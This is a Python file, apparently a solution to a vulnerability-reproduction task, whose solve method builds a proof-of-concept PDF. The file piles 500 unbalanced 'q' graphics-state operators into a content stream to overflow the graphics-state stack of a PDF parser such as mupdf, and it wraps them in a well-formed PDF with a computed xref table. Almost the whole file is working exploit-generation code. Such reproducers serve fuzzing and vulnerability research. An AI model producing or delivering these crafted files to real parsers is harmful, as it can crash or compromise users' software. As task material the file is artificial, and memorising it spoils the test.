import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) for a heap buffer overflow in a PDF parser.
        The vulnerability is triggered by exceeding the graphics state stack limit.
        The PDF 'q' operator pushes the current graphics state onto a stack. By
        issuing many 'q' commands without corresponding 'Q' (restore) commands,
        we can cause a stack overflow.
        """
        
        # The typical graphics state stack limit in PDF renderers like mupdf is 256.
        # We use 500 'q' operations to ensure the overflow is triggered.
        num_q_ops = 500
        payload = b'q ' * num_q_ops

        # Construct a minimal, valid PDF file structure to deliver the payload.
        # The objects are defined and will be placed sequentially in the file.
        objects = []
        
        # Object 1: Document Catalog (the root object)
        objects.append(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")
        
        # Object 2: Pages Tree
        objects.append(b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")
        
        # Object 3: A single Page object
        objects.append(b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n")
        
        # Object 4: The Content Stream containing the malicious payload
        stream_header = b"<< /Length %d >>" % len(payload)
        objects.append(b"4 0 obj\n" + stream_header + b"\nstream\n" + payload + b"\nendstream\nendobj\n")

        # PDF Header, including a binary comment to mark the file as binary.
        header = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"

        # Assemble the main body of the PDF and calculate the byte offset of each object.
        # These offsets are required for the cross-reference (xref) table.
        body = b""
        # Offsets are 1-indexed to match PDF object numbers.
        offsets = [0] * (len(objects) + 1)
        current_offset = len(header)
        
        for i, obj_data in enumerate(objects):
            obj_num = i + 1
            offsets[obj_num] = current_offset
            body += obj_data
            current_offset += len(obj_data)

        # The cross-reference table starts immediately after the body.
        xref_start_offset = current_offset
        
        # Build the xref table.
        xref_table = bytearray()
        xref_table.extend(b"xref\n")
        xref_table.extend(b"0 %d\n" % (len(objects) + 1))
        # Entry 0 is a special case for the linked list of free objects.
        xref_table.extend(b"0000000000 65535 f \n")
        for i in range(1, len(objects) + 1):
            xref_table.extend(b"%010d 00000 n \n" % offsets[i])

        # Build the trailer, which points to the root object and the xref table.
        trailer_dict = b"<< /Size %d /Root 1 0 R >>" % (len(objects) + 1)
        trailer = b"trailer\n" + trailer_dict + b"\n"
        trailer += b"startxref\n"
        trailer += b"%d\n" % xref_start_offset
        trailer += b"%%EOF"
        
        # Combine all parts to form the final PoC file.
        poc = header + body + bytes(xref_table) + trailer
        return poc
